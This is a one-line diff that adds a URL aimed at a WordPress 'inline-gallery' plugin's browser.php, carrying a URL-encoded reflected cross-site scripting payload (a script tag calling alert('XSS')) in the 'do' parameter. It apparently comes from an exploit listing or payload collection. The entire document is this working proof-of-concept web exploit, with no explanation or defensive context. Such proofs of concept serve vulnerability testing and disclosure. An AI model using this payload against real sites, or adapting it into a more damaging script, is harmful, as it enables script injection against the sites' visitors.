@@ -1,0 +1,1 @@
+http://www.example.com/wp-content/plugins/inline-gallery/browser/browser.php?do=%3Cscript%3Ealert%28%22XSS%22%29;%3C/script%3E
